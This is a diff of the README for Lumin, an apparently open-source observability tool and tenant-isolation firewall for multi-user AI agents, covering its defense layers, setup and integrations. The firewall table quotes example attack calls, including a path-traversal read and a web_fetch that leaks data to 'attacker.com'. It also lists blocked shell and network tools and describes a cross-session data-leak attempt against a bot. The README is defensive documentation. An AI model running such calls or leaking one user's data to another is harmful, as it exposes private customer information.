@@ -1,59 +1,223 @@
-# Lumin
+<!-- Banner image — replace with your assets/lumin-banner.png once uploaded -->
+<p align="center">
+   <img alt="Lumin — local-first AI agent observability + tenant-isolation firewall"
+        src="assets/dashboard-trace.png" width="100%">
+</p>
 
-> Local-first AI agent observability. Runs on your laptop. No account, no telemetry — Lumin never ships your traces anywhere.
+<div align="center">
+   <h3>
+      <a href="#-quickstart">
+         <strong>Self-Host in 60 seconds</strong>
+      </a> ·
+      <a href="#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle">
+         <strong>Tenant Firewall</strong>
+      </a> ·
+      <a href="#-integrations">
+         <strong>Integrations</strong>
+      </a> ·
+      <a href="https://github.com/amitbidlan/zistica-lumin/issues/new">
+         <strong>Report Bug</strong>
+      </a> ·
+      <a href="https://github.com/amitbidlan/zistica-lumin/discussions">
+         <strong>Discussions</strong>
+      </a>
+   </h3>
+</div>
 
-[![CI](https://github.com/amitbidlan/zistica-lumin/actions/workflows/ci.yml/badge.svg)](https://github.com/amitbidlan/zistica-lumin/actions/workflows/ci.yml)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org)
-[![Node](https://img.shields.io/badge/node-18+-green.svg)](https://nodejs.org)
+<p align="center">
+   <a href="https://github.com/amitbidlan/zistica-lumin/blob/main/LICENSE">
+      <img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="Apache 2.0 License">
+   </a>
+   <a href="https://github.com/amitbidlan/zistica-lumin/actions/workflows/ci.yml">
+      <img src="https://github.com/amitbidlan/zistica-lumin/actions/workflows/ci.yml/badge.svg" alt="CI">
+   </a>
+   <a href="https://github.com/amitbidlan/zistica-lumin/stargazers">
+      <img src="https://img.shields.io/github/stars/amitbidlan/zistica-lumin?style=social" alt="GitHub stars">
+   </a>
+   <a href="https://github.com/amitbidlan/zistica-lumin/commits/main">
+      <img src="https://img.shields.io/github/last-commit/amitbidlan/zistica-lumin?labelColor=%20%2332b583&color=%20%2312b76a" alt="Last commit">
+   </a>
+   <a href="https://hub.docker.com/r/zistica/lumin">
+      <img src="https://img.shields.io/badge/docker-zistica%2Flumin-2496ed?logo=docker" alt="Docker">
+   </a>
+   <a href="https://www.python.org">
+      <img src="https://img.shields.io/badge/python-3.11+-3776ab?logo=python&logoColor=white" alt="Python 3.11+">
+   </a>
+   <a href="https://nodejs.org">
+      <img src="https://img.shields.io/badge/node-18+-339933?logo=node.js&logoColor=white" alt="Node 18+">
+   </a>
+   <a href="https://www.typescriptlang.org">
+      <img src="https://img.shields.io/badge/typescript-strict-3178c6?logo=typescript&logoColor=white" alt="TypeScript strict">
+   </a>
+</p>
 
-You build an AI agent. It works in testing. You deploy it. A user complains it gave a wrong answer. You have no idea why — which step failed, what data it used, where it went wrong.
+<p align="center">
+   Lumin is an <strong>open-source, local-first observability + agent firewall</strong> for AI bots.<br/>
+   Drop in 2 lines to <strong>trace every step</strong>. Add the firewall to <strong>structurally block cross-session leaks</strong> in multi-user bots.<br/>
+   Self-hosted in a single Docker container — no cloud, no telemetry, no vendor lock-in.
+</p>
 
-Lumin is a CCTV camera for your AI agent. Add 2 lines of code. Every decision, every tool call, every LLM response — recorded, visible, debuggable.
+<!-- 52-second walkthrough: cross-session leak attempt → all 5 layers
+     blocking → dashboard trace evidence. Click the poster to play.
+     For guaranteed inline rendering on the GitHub web README, drop
+     ``assets/demo.mp4`` into a PR/issue editor (gets a stable
+     user-attachments URL) and swap the ``src`` here. -->
+<p align="center">
+   <video src="https://github.com/amitbidlan/zistica-lumin/raw/main/assets/demo.mp4"
+          poster="assets/demo-poster.jpg"
+          width="80%" controls muted playsinline>
+      <a href="assets/demo.mp4">
+         <img alt="Lumin demo — 52-second walkthrough (click to play)"
+              src="assets/demo-poster.jpg" width="80%">
+      </a>
+   </video>
+</p>
+<p align="center">
+   <sub>52-second walkthrough — Telegram user plants customer notes, Slack user attempts the leak, Lumin's 5 layers block every bypass route. <a href="assets/demo.mp4">Direct download</a> (2.4MB).</sub>
+</p>
 
 ---
 
-## Quick start
+## ✨ Core Features
 
-### Option 1 — Docker compose (recommended)
+<p align="center">
+   <img alt="Lumin feature overview"
+        src="assets/dashboard-trace.png" width="100%">
+</p>
+
+- **🔍 Agent observability** — instrument any Python or TypeScript agent in 2 lines. Captures every LLM call, tool invocation, retrieval, embedding, and custom span. Real-time WebSocket push to the dashboard, no refresh.
+
+- **🛡️ [Tenant-isolation firewall](#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle)** — five layers of structural defense for multi-user bots (Slack, Telegram, Discord, internal SaaS). Per-user file sandbox, deny-by-default for shells / network egress, conversation-history reset on sender switch, Presidio-powered prompt redaction, full audit trail. **Stops cross-session leaks structurally — not with a regex.**
+
+- **⚙️ [One-knob security profiles](#3%EF%B8%8F⃣-1%EF%B8%8F⃣-configure-your-agents-plugin)** — pick `strict`, `standard`, `light`, or `logging-only`. Each profile sets sensible defaults across all five layers. Override individual toggles via dashboard UI without touching config files.
+
+- **📊 [Policy engine](packages/api/firewall/)** — DB-backed rules that fire on every span/trace ingest: cost runaways, prompt-injection patterns, PII in output, runaway loops. Per-agent scoping. Full audit log. Server-side enforcement so SDK and integrations get identical behavior.
+
+- **💬 [Multi-turn sessions](packages/dashboard/app/sessions/)** — group related traces under a single conversation. Aggregate cost, duration, and quality across turns.
+
+- **💰 Cost & token tracking** — automatic per-call breakdown for OpenAI, Anthropic, Ollama, and Anthropic extended-thinking blocks (counted as separate spans).
+
+- **🌊 [Real-time stream](packages/dashboard/lib/websocket.ts)** — WebSocket fanout pushes new traces and spans to the dashboard the instant they're ingested. Falls back to 5-second polling when the socket can't connect.
+
+- **🛟 [Resilient by design](packages/sdk-python/lumin/exporter.py)** — your agent never fails because Lumin is down. Spans drop silently if the queue overflows, the exporter is unreachable, or the server returns 5xx. Rule 7 of the spec: **a Lumin outage MUST never affect the agent**.
+
+- **🏠 Local-first** — single Docker image, DuckDB + SQLite, no external services, no cloud dependency. Runs on a laptop or a 2-vCPU VPS.
+
+## 🛡️ The Tenant-Isolation Firewall — Lumin's Unique Angle
+
+Most LLM observability tools tell you what your bot did *after* it did it. They don't stop one customer's data from leaking into another customer's chat. **Lumin does.**
+
+The five-layer defense:
+
+| Layer | What it does |
+|---|---|
+| **L1 storage sandbox** | Every fs tool call (`read`, `write`, `edit`, `grep`, `cat`, `head`, `tail`, …) gets its `path` parameter rewritten to `${workspace}/_lumin/by-sender/<sender>/`. The bot literally has no path to another tenant's data. |
+| **L1.5 deny shell + egress** | Tools that bypass file paths — `exec`, `shell`, `bash`, `python`, `web_fetch`, `http_get`, `curl` — refused by default. An attacker can't `exec("cat ../alice/secret")` or `web_fetch("https://attacker.com?leak=...")`. |
+| **L2 conversation history reset** | When the active sender changes for a shared agent, the LLM's message history is wiped before it sees the next turn. Foreign-tenant text never enters context. |
+| **L3 input redaction** | Every prompt + history scanned by Presidio NER (names, emails, locations, organizations) + structural ID regexes + foreign-vault excerpts before the LLM call. Replaced with `[REDACTED]`. |
+| **L4 audit trail** | Every block, redaction, and sandbox rewrite generates a row in `policy_violations` queryable from the dashboard `/violations` page. Webhooks fire to PagerDuty / Slack / SIEM. |
+
+**Verified live**: a real Telegram → Slack leak attempt with the `standard` profile blocked all 5+ bypass routes (3 `exec` calls denied, 2 `read` calls sandboxed to empty per-sender dir, 97 prior-tenant messages cleared from history, foreign-vault entries redacted from the prompt). The bot's reply contained zero foreign-tenant data. See the demo video above.
+
+Compare to other tools:
+
+| | Lumin | Langfuse | Lakera | NemoGuard |
+|---|---|---|---|---|
+| **Tracing/spans/evals** | ✅ | ✅ | ❌ | ❌ |
+| **Per-user file sandbox** | ✅ structural | ❌ | ❌ | ❌ |
+| **Conversation history isolation** | ✅ structural | ❌ | ❌ | ❌ |
+| **PII redaction in prompt** | ✅ Presidio | ❌ | ✅ classifier | ✅ classifier |
+| **Deny-by-default for exec/web_fetch** | ✅ | ❌ | ❌ | ❌ |
+| **Self-hosted single Docker** | ✅ | ⚠️ ClickHouse + Postgres + Redis + S3 | ❌ SaaS | ❌ NIM endpoint |
+| **Open source (Apache-2.0)** | ✅ | ✅ MIT | ❌ | ✅ Apache-2.0 |
+
+Lumin replaces Langfuse for one specific job: **keeping multi-tenant bots safe**. For everything else, Lumin and Langfuse can co-exist (different layers).
+
+---
+
+## 📦 Deploy
+
+### Local — Docker compose (recommended)
+
+Single command, single container, both API and dashboard:
 
 ```bash
 git clone https://github.com/amitbidlan/zistica-lumin
 cd zistica-lumin
-cp .env.example .env          # optional — edit thresholds / SMTP
-docker compose up -d --wait   # builds and waits until /health responds
+docker compose up -d --wait
 ```
 
-`docker compose up -d --wait` returns clean only when the container's healthcheck passes — useful in CI / orchestration scripts. Drop `--wait` for an interactive run.
+Then open <http://localhost:3000>. To stop: `docker compose down`. To wipe state: `docker compose down -v`.
 
-Then open <http://localhost:3000>.
-
-To stop: `docker compose down`. To wipe state: `docker compose down -v` (removes the `lumin-data` named volume — months of training data and traces, gone — be sure).
-
-### Option 2 — Plain `docker run`
+### VM — single `docker run`
 
 ```bash
-docker build -t lumin .
 docker run -d \
   --name lumin \
   -p 127.0.0.1:3000:3000 \
   -p 127.0.0.1:8000:8000 \
   -v lumin-data:/data \
-  lumin
+  zistica/lumin:latest
 ```
 
-Both ports matter:
-- **`3000`** — the dashboard (this is what you open in the browser)
-- **`8000`** — the API. The browser also connects to it directly for the WebSocket real-time stream. Skip this mapping and the dashboard still works, but new traces appear via 5-second polling instead of live push.
+⚠️ **Public VPS deployment**: the dashboard at `:3000` has **no authentication today**. Bind ports to `127.0.0.1` (as shown) and reach the dashboard via SSH tunnel: `ssh -L 3000:localhost:3000 user@vps`. Auth lands in Slice 5B.
 
-⚠️ **Public VPS deployment**: the dashboard at `:3000` has **no authentication today**. Bind ports to `127.0.0.1` (as shown above) and reach the dashboard via SSH tunnel: `ssh -L 3000:localhost:3000 user@vps`. Auth (bearer token + dashboard password) lands in Slice 5B.
+### Smaller image (size-constrained VPS)
 
-Open <http://localhost:3000> — the agent grid (`/agents`) is the dashboard home. From there you can drill into individual agents, traces, sessions, and policy violations.
+Default image ships `en_core_web_lg` (Presidio NER, ~750MB). Swap to `_md` (40MB) at build time:
 
-Then in your agent:
+```bash
+docker compose build --build-arg LUMIN_PRESIDIO_MODEL=en_core_web_md
+```
+
+---
+
+## 🔌 Integrations
+
+<p align="center">
+   <img alt="Lumin integrations" src="assets/dashboard-details.png" width="100%">
+</p>
+
+### First-party SDKs and plugins
+
+| Integration | Type | Description |
+| --- | --- | --- |
+| [Python SDK](packages/sdk-python/) | `pip install -e .` | `@lumin.trace` decorator, `lumin.span()` context manager, sessions, policy engine, framework integrations |
+| [TypeScript SDK](packages/sdk-typescript/) | `@lumin-io/sdk` | Wire-format peer of the Python SDK; identical behavior |
+| [LangChain](packages/sdk-python/lumin/integrations/langchain.py) | Python, callback handler | Zero-config via `LUMIN_TRACING=true` — every chain auto-traced |
+| [LlamaIndex](packages/sdk-python/lumin/integrations/llama_index.py) | Python, callback manager | RAG retrievers, embeddings, query engines, agents |
+| [CrewAI](packages/sdk-python/lumin/integrations/crewai.py) | Python | Multi-agent crews — kickoff → agent → tasks tree |
+| [Anthropic](packages/sdk-python/lumin/integrations/anthropic.py) | Python | Extended-thinking blocks captured as first-class child spans |
+| [OpenAI compat](packages/api/routers/proxy.py) | HTTP proxy | Point any OpenAI / Ollama / Anthropic-compat client at `:8000/v1/openai` — auto-instruments without code changes |
+| [Mastra](packages/integrations/mastra/) | `@lumin-io/mastra` | TypeScript agent framework — drop-in replacement for `@mastra/langfuse` |
+| [VoltAgent](packages/integrations/voltagent/) | `@lumin-io/voltagent` | OTel-native exporter |
+| [OpenClaw — OTel](packages/integrations/openclaw/) | `@lumin-io/openclaw` | OTLP receiver, zero-code, no-content (provider/model/tokens/cost only) |
+| [OpenClaw — full content](packages/integrations/openclaw-diagnostics/) | `@lumin-io/openclaw-diagnostics` | Typed-hook plugin: prompts, replies, thinking, **+ the full firewall** |
+| [OTel / OTLP](packages/api/routers/otlp.py) | endpoint | `POST /v1/otlp/v1/traces` — receives from any OTel-instrumented agent |
+
+Compatible with anything that speaks OpenTelemetry (Logfire, Phoenix, Datadog GenAI, OpenLLMetry, …).
+
+---
+
+## 🚀 Quickstart
+
+### 1️⃣ Start Lumin
+
+```bash
+git clone https://github.com/amitbidlan/zistica-lumin
+cd zistica-lumin
+docker compose up -d --wait
+# Lumin API on :8000, dashboard on :3000
+```
+
+### 2️⃣ Trace your first call
+
+**Python:**
 
 ```python
 import lumin
+
+lumin.configure(host="http://localhost:8000")  # or set LUMIN_HOST
 
 @lumin.trace
 def my_agent(question: str) -> str:
@@ -61,45 +225,96 @@ def my_agent(question: str) -> str:
     return gpt4_answer(question, docs)
 
 my_agent("What is the capital of France?")
-# Trace appears in the dashboard.
+# Trace appears in the dashboard within ~50ms.
 ```
 
-That's it. No account, no API key, and Lumin itself never sends your traces anywhere — they live in a DuckDB file on disk. (Whatever LLM provider your agent calls is its own conversation, of course.)
+**TypeScript:**
+
+```typescript
+import { configure, trace } from '@lumin-io/sdk';
+
+configure({ host: 'http://localhost:8000' });
+
+const myAgent = trace(async (input: string) => {
+  return 'hello';
+}, { name: 'my_agent' });
+
+await myAgent('test');
+```
+
+**LangChain (zero-config):**
+
+```python
+import os
+os.environ["LUMIN_HOST"] = "http://localhost:8000"
+os.environ["LUMIN_TRACING"] = "true"
+
+from langchain_openai import ChatOpenAI
+ChatOpenAI().invoke("Hello")  # span recorded with model, tokens, cost
+```
+
+### 3️⃣ Open the dashboard
+
+<http://localhost:3000>
+
+That's it. No account, no API key, and **Lumin itself never sends your traces anywhere** — they live in a DuckDB file on disk.
 
 ---
 
-## Preview
+## 🛡️ Add the firewall (multi-user bots)
 
-![Trace list — paginated, auto-refreshing every 5 seconds](assets/dashboard-trace.png)
+If your bot serves multiple users (Slack, Telegram, Discord, internal SaaS), turn on tenant isolation:
 
-*Trace list — every agent run on a paginated, live-refreshing table.*
+### 1️⃣ Configure your agent's plugin
 
-![Trace detail — span timeline with expanded input/output](assets/dashboard-details.png)
+In `~/.openclaw/openclaw.json` (or your agent framework's plugin config):
 
-*Trace detail — click any span in the timeline to inspect its input/output JSON. Errors render in red.*
+```json
+"plugins": {
+  "entries": {
+    "lumin-diagnostics": {
+      "enabled": true,
+      "config": {
+        "securityProfile": "standard"
+      }
+    }
+  }
+}
+```
+
+That's the whole config. **90% of operators stop here.**
+
+### 2️⃣ (Optional) Fine-tune
+
+Override individual toggles via the dashboard at <http://localhost:3000/settings/firewall>:
+
+- `enableTenantIsolation` — master switch
+- `blockShellTools` — block exec, shell, bash, python, ruby
+- `blockWebTools` — block web_fetch, http_get, curl
+- `resetMemoryBetweenUsers` — `between-users` / `between-channels` / `never`
+- `hideOtherUsersData` — Presidio + structural redaction
+- `recordSecurityEvents` — audit-table volume
+
+Or pick a profile that matches your deployment:
+
+| Profile | Use case |
+| --- | --- |
+| `strict` | Healthcare, finance, legal, regulated multi-tenant SaaS |
+| `standard` *(default)* | Multi-user support / sales triage bots |
+| `light` | Single-team internal bots, dev environments |
+| `logging-only` | Lumin as a Langfuse-style observer (no blocks) |
+
+Each toggle is documented at length in `~/.openclaw/extensions/lumin-diagnostics/openclaw.plugin.json` (the plugin manifest's `configSchema` carries inline descriptions). Dashboard UI also shows live help text per toggle.
+
+### 3️⃣ Verify
+
+Send a test message from sender A. Send a probing message from sender B. Watch the traces at `/traces`, the violations at `/violations`, the dashboard's effective-settings panel at `/settings/firewall`. Cross-session leak attempts show up as `lumin_egress_deny:exec` / `lumin_sandbox_block:*` rows. The bot's own reply contains zero foreign data.
+
+A real walkthrough — Telegram user planted "Northstar Logistics, Priya Raman, $48k ARR" customer notes; Slack user asked for the same data. The bot's reply contained zero foreign-tenant content. Trace evidence: 3× `lumin_egress_deny:exec`, 2× sandbox rewrites to empty per-sender dirs, 97 prior-tenant messages cleared from history at sender-switch. See the [demo video](#-) above for the live capture.
 
 ---
 
-## What you get
-
-- **Agent grid** — `/agents` is the dashboard home. Every distinct trace name appears as an agent card, grouped by integration framework (OpenClaw / Mastra / VoltAgent / Python SDK). Each card shows last-seen activity, traces, cost, top model, and a 60-minute sparkline. Long-tail sections cap at 6 cards with a "view all" tile that drops you into the dedicated framework page.
-- **Live indicators** — every card has an activity dot (active / idle / dormant) that flips on WebSocket events without a page refresh. A "thinking" pill pulses on cards with traces in flight. Polling fallback when WS disconnects.
-- **Policy engine** — `/policies` UI to create, edit, and delete rules that fire when an agent misbehaves (cost runaways, prompt-injection patterns, PII in output, runaway loops). Rules are DB-backed with a full audit log; per-agent scoping via `scope.agents: [...]`. The engine evaluates server-side after every span/trace ingest, so TS integrations get the same enforcement as the Python SDK.
-- **Span timeline** — every LLM call, tool invocation, retrieval, and custom span rendered as an indented tree, click any span to expand its input/output JSON.
-- **Multi-turn sessions** — group related traces under a single conversation; the dashboard's `/sessions` view shows turns in chronological order with aggregate cost, duration, and quality.
-- **Real-time updates** — WebSocket stream pushes traces and spans into the dashboard the moment they're ingested, no refresh; falls back to 5-second polling if the socket can't connect.
-- **Cost & token tracking** — automatic per-call breakdown for OpenAI and Anthropic model families.
-- **Quality scoring** — bring-your-own evals via `POST /v1/evals`.
-- **Framework integrations** — drop-in support for [LangChain](https://github.com/langchain-ai/langchain) (zero-config via `LUMIN_TRACING=true` — see [section](#langchain)), [LlamaIndex](https://github.com/run-llama/llama_index) ([section](#llamaindex)), [CrewAI](https://github.com/crewAIInc/crewAI) ([section](#crewai)), [Anthropic](https://github.com/anthropics/anthropic-sdk-python) with extended-thinking visualization ([section](#anthropic)), [Mastra](https://github.com/mastra-ai/mastra) ([`@lumin-io/mastra`](packages/integrations/mastra/)), [OpenClaw](https://github.com/openclaw/openclaw) (two paths — zero-code OTLP receiver _or_ full-content typed-hook plugin [`@lumin-io/openclaw-diagnostics`](packages/integrations/openclaw-diagnostics/), see [section](#openclaw)), and [VoltAgent](https://github.com/voltagent/voltagent) ([`@lumin-io/voltagent`](packages/integrations/voltagent/)).
-- **OpenAI-compatible LLM proxy** — point any OpenAI / Ollama / Anthropic-compat client base URL at `http://localhost:8000/v1/openai` and Lumin captures the request, response, tokens, cost, and (W3C `traceparent` if you send one) for every call without touching agent code. Streaming and non-streaming both work.
-- **Cross-language SDKs** — Python and TypeScript with identical wire format and behavior.
-- **Resilient by design** — the agent never fails because Lumin is down. Spans drop silently if the queue overflows, the exporter is unreachable, or the server returns an error.
-- **Local-first** — single Docker image, DuckDB + SQLite, no external services, no cloud dependency.
-- **90-day retention** — automatic cleanup task keeps the database from growing unbounded (configurable via env var).
-
----
-
-## Architecture
+## 🏗️ Architecture
 
 ```
    Agent code (Python or TypeScript)
@@ -121,77 +336,62 @@ That's it. No account, no API key, and Lumin itself never sends your traces anyw
                   /api/* (HTTP rewrite proxy)
 ```
 
-Single Docker container runs the API on `:8000` and the Next.js standalone dashboard on `:3000`. HTTP requests go through the dashboard's `/api/*` rewrite proxy (so the browser never crosses origins for HTTP). WebSocket connects directly to `:8000/ws/traces` — Next.js rewrites are HTTP-only, so port `8000` must be exposed for real-time updates (the dashboard falls back to 5-second polling otherwise).
+Single Docker container runs the API on `:8000` and the Next.js standalone dashboard on `:3000`. Browser HTTP traffic goes through `/api/*` rewrites (same-origin → no CORS). WebSocket connects directly to `:8000/ws/traces` for real-time push.
 
 ---
 
-## Packages
+## 📦 Packages
 
 | Path | Package | Tests |
 |---|---|---|
-| [`packages/sdk-python/`](packages/sdk-python/) | Python SDK — `@lumin.trace`, `lumin.span()`, `lumin.session()`, policy engine, framework integrations | 209 |
-| [`packages/sdk-typescript/`](packages/sdk-typescript/) | `@lumin-io/sdk` — peer of the Python SDK | 59 |
-| [`packages/api/`](packages/api/) | FastAPI ingest + query API, DuckDB storage, WebSocket fanout, agent grid, server-side policy engine | 169 |
-| [`packages/integrations/openclaw/`](packages/integrations/openclaw/) | `@lumin-io/openclaw` — OTel exporter for OpenClaw agents | 59 |
-| [`packages/integrations/openclaw-diagnostics/`](packages/integrations/openclaw-diagnostics/) | `@lumin-io/openclaw-diagnostics` — typed-hook plugin (full-content prompts, replies, thinking) | 9 |
-| [`packages/integrations/mastra/`](packages/integrations/mastra/) | `@lumin-io/mastra` — observability config + exporter for Mastra | 55 |
-| [`packages/integrations/voltagent/`](packages/integrations/voltagent/) | `@lumin-io/voltagent` — OTel-native exporter for VoltAgent | 62 |
-| [`packages/dashboard/`](packages/dashboard/) | Next.js 14 dashboard — agent grid, traces, sessions, violations, policy editor | build + 21 Playwright E2E |
+| [`packages/sdk-python/`](packages/sdk-python/) | Python SDK — `@lumin.trace`, `lumin.span()`, sessions, policy engine, framework integrations | 209 |
+| [`packages/sdk-typescript/`](packages/sdk-typescript/) | `@lumin-io/sdk` — TS peer of the Python SDK | 59 |
+| [`packages/api/`](packages/api/) | FastAPI ingest + query API, DuckDB storage, WebSocket fanout, server-side policy engine, firewall settings | 169 |
+| [`packages/integrations/openclaw/`](packages/integrations/openclaw/) | `@lumin-io/openclaw` — OTel exporter | 59 |
+| [`packages/integrations/openclaw-diagnostics/`](packages/integrations/openclaw-diagnostics/) | `@lumin-io/openclaw-diagnostics` — typed-hook plugin + full tenant-isolation firewall | 67 |
+| [`packages/integrations/mastra/`](packages/integrations/mastra/) | `@lumin-io/mastra` — observability config + exporter | 55 |
+| [`packages/integrations/voltagent/`](packages/integrations/voltagent/) | `@lumin-io/voltagent` — OTel-native exporter | 62 |
+| [`packages/dashboard/`](packages/dashboard/) | Next.js 14 dashboard | build + 21 Playwright E2E |
 
 ---
 
-## Install
-
-### Whole workspace (recommended for contributors)
+## 🛠️ Install for development
 
 ```bash
 ./setup.sh
 ```
 
-One-shot installer: creates `packages/api/.venv`, installs the local Python SDK editable, installs API dependencies, runs `npm ci` across all 5 Node packages — in the right order. Required because the API imports `lumin` from the sibling `packages/sdk-python`, not from PyPI (where an unrelated package shares the name).
+One-shot installer: creates `packages/api/.venv`, installs the local Python SDK editable, installs API dependencies, runs `npm ci` across all 5 Node packages.
 
-### Python SDK
+The API imports `lumin` from the sibling `packages/sdk-python/`, NOT from PyPI (where an unrelated package shares the name). Don't `pip install lumin` from PyPI inside this workspace.
+
+### Python SDK only
 
 ```bash
-pip install -e packages/sdk-python              # core only
-pip install -e packages/sdk-python[langchain]   # + LangChain integration
-pip install -e packages/sdk-python[crewai]      # + CrewAI integration
-pip install -e packages/sdk-python[anthropic]   # + Anthropic integration
-pip install -e packages/sdk-python[llama_index] # + LlamaIndex integration
+pip install -e packages/sdk-python              # core
+pip install -e packages/sdk-python[langchain]   # + LangChain
+pip install -e packages/sdk-python[crewai]      # + CrewAI
+pip install -e packages/sdk-python[anthropic]   # + Anthropic
+pip install -e packages/sdk-python[llama_index] # + LlamaIndex
 pip install -e packages/sdk-python[all]         # all integrations
 ```
 
-### TypeScript SDK
+### TypeScript SDK only
 
 ```bash
-# Build the SDK locally (it's not yet published to npm):
 cd packages/sdk-typescript && npm install && npm run build
 
-# Then in your project, link or install from the path:
+# In your project:
 npm install /absolute/path/to/zistica-lumin/packages/sdk-typescript
 ```
 
-### Whole stack via Docker
+### Docker (whole stack)
 
-Already covered in [Quick start](#quick-start). One image, both API and dashboard.
+Already covered in [Deploy](#-deploy). One image, both API and dashboard.
 
 ---
 
-## Usage
-
-### Python — decorator
-
-```python
-import lumin
-
-lumin.configure(host="http://localhost:8000")  # or set LUMIN_HOST
-
-@lumin.trace
-def my_agent(input: str) -> str:
-    return "hello"
-
-my_agent("test")  # trace appears in the dashboard
-```
+## 📚 Usage examples
 
 ### Python — context manager (manual span)
 
@@ -201,82 +401,7 @@ with lumin.span("retrieval", type="retrieval") as s:
     s.set_output({"count": len(results)})
 ```
 
-### TypeScript
-
-```typescript
-import { configure, trace } from '@lumin-io/sdk';
-
-configure({ host: 'http://localhost:8000' });
-
-const myAgent = trace(async (input: string) => {
-  return 'hello';
-}, { name: 'my_agent' });
-
-await myAgent('test');
-```
-
-### LangChain
-
-Works with [LangChain](https://github.com/langchain-ai/langchain) (Python). Zero-config — set the env var before importing LangChain and every chain is auto-traced:
-
-```python
-import os
-os.environ["LUMIN_HOST"] = "http://localhost:8000"
-os.environ["LUMIN_TRACING"] = "true"
-
-from langchain_openai import ChatOpenAI
-ChatOpenAI().invoke("Hello")  # span recorded with model, tokens, cost
-```
-
-Or attach the handler explicitly:
-
-```python
-from lumin.integrations.langchain import LuminCallbackHandler
-
-handler = LuminCallbackHandler()
-llm = ChatOpenAI(callbacks=[handler])
-```
-
-### CrewAI
-
-For [CrewAI](https://github.com/crewAIInc/crewAI) multi-agent crews:
-
-```python
-from lumin.integrations.crewai import instrument_crew
-instrument_crew()
-
-from crewai import Agent, Task, Crew
-crew = Crew(agents=[...], tasks=[...])
-crew.kickoff()
-# crew.kickoff -> root span
-# each agent.execute_task -> child span
-# LLM calls inside agents -> grandchildren (via the LangChain integration)
-```
-
-### LlamaIndex
-
-For [LlamaIndex](https://github.com/run-llama/llama_index) RAG pipelines and agents:
-
-```python
-from lumin.integrations.llama_index import LuminCallbackHandler
-from llama_index.core import Settings, VectorStoreIndex, Document
-from llama_index.core.callbacks import CallbackManager
-
-handler = LuminCallbackHandler()
-Settings.callback_manager = CallbackManager([handler])
-
-index = VectorStoreIndex.from_documents([Document(text="…")])
-index.as_query_engine().query("what is …?")
-# query (root)
-#   retrieve (retrieval)  -- retrieved nodes + similarity scores
-#     embedding (embedding) -- query embedding model + tokens
-#   synthesize (custom)
-#     llm_call (llm)       -- model, tokens, cost
-```
-
-### Anthropic
-
-For [Anthropic Claude](https://github.com/anthropics/anthropic-sdk-python) — captures extended-thinking blocks as first-class child spans:
+### Python — Anthropic with extended thinking
 
 ```python
 from lumin.integrations.anthropic import instrument_anthropic
@@ -290,16 +415,25 @@ client.messages.create(
     thinking={"type": "enabled", "budget_tokens": 10000},
     messages=[{"role": "user", "content": "..."}],
 )
-# claude_call -> parent (model, tokens, cost)
-#   thinking -> child (reasoning text, ~thinking tokens, output-rate cost)
-#   response -> child (final text, response tokens, cost)
 # Dashboard renders thinking rows with a brain emoji + per-trace
 # thinking-vs-response cost breakdown.
 ```
 
-### Mastra
+### Python — CrewAI
 
-For [Mastra](https://github.com/mastra-ai/mastra) (TypeScript agent framework). Drop-in replacement for `@mastra/langfuse` if you want local-first observability without sending data to a hosted SaaS:
+```python
+from lumin.integrations.crewai import instrument_crew
+instrument_crew()
+
+from crewai import Agent, Task, Crew
+crew = Crew(agents=[...], tasks=[...])
+crew.kickoff()
+# crew.kickoff -> root span
+# each agent.execute_task -> child span
+# LLM calls inside agents -> grandchildren (via the LangChain integration)
+```
+
+### TypeScript — Mastra
 
 ```typescript
 import { Mastra } from '@mastra/core';
@@ -311,289 +445,56 @@ export const mastra = new Mastra({
 });
 ```
 
-See [`packages/integrations/mastra/`](packages/integrations/mastra/) for the dedicated `@lumin-io/mastra` package.
+### OpenAI-compatible HTTP proxy (no SDK)
 
-### OpenClaw
-
-[OpenClaw](https://github.com/openclaw/openclaw) has two integration paths with Lumin. They compose — you can run both at once, or pick the one that matches what you need.
-
-#### Path A — zero-code OTLP receiver (no content)
-
-OpenClaw's bundled [`diagnostics-otel`](https://docs.openclaw.ai/gateway/opentelemetry) plugin emits OTLP spans for every model call, tool execution, and run phase. Lumin's OTLP/HTTP endpoint receives them directly — **no agent-code changes, no SDK install**.
-
-```bash
-# Step 1 — start Lumin
-docker run -p 3000:3000 -p 8000:8000 zistica/lumin
-
-# Step 2 — point OpenClaw at Lumin
-openclaw config set diagnostics.enabled true
-openclaw config set diagnostics.otel.enabled true
-openclaw config set diagnostics.otel.endpoint "http://localhost:8000/v1/otlp"
-openclaw daemon restart
-
-# Step 3 — open http://localhost:3000
-# every OpenClaw run lands in the agent grid automatically
-```
-
-You get: provider / model / token counts / duration / cost, the full phase tree (run → harness.run → model.call → tool.execution), and policy enforcement. **You do NOT get prompts, responses, or tool I/O** — `diagnostics-otel` exposes a `captureContent` flag, but the runtime never populates the underlying event fields (the flag is effectively a no-op as of OpenClaw 2026.5.x).
-
-#### Path B — full-content via [`@lumin-io/openclaw-diagnostics`](packages/integrations/openclaw-diagnostics/) (recommended)
-
-To capture prompts, assistant replies, tool I/O, and reasoning-model thinking, install the typed-hook plugin from npm:
-
-```bash
-openclaw plugins install @lumin-io/openclaw-diagnostics
-```
-
-Then enable conversation access for it in `~/.openclaw/openclaw.json` (non-bundled plugins are conversation-gated by default):
-
-```json
-{
-  "plugins": {
-    "entries": {
-      "lumin-diagnostics": {
-        "hooks": { "allowConversationAccess": true }
-      }
-    }
-  }
-}
-```
-
-Restart the gateway (`openclaw daemon restart`) and the plugin subscribes to OpenClaw's `llm_input` / `llm_output` typed hooks — full content lands at `http://localhost:8000/v1/spans` per turn, complete with thinking blocks for reasoning models (gpt-oss, o-series, claude-extended-thinking). Combine with Path A for the full picture, or run on its own if you only want the LLM-level view.
-
-#### Older OpenClaw releases
-
-OpenClaw releases predating `diagnostics-otel` can use the in-process SDK exporter at [`@lumin-io/openclaw`](packages/integrations/openclaw/) instead — useful for client-side cost calculation or custom span subtypes.
-
-### OpenAI-compatible LLM proxy
-
-Lumin's third ingest rail. Point any OpenAI / Ollama / Anthropic-compat client at `http://localhost:8000/v1/openai` and Lumin proxies the request to your real backend, captures the request + response on the way back, and never blocks the call. Works with any client library — no SDK install, no decorator, no framework integration needed.
+Point any OpenAI-compatible client at `:8000/v1/openai`. Lumin captures every request, response, tokens, and cost — without touching agent code:
 
 ```python
 from openai import OpenAI
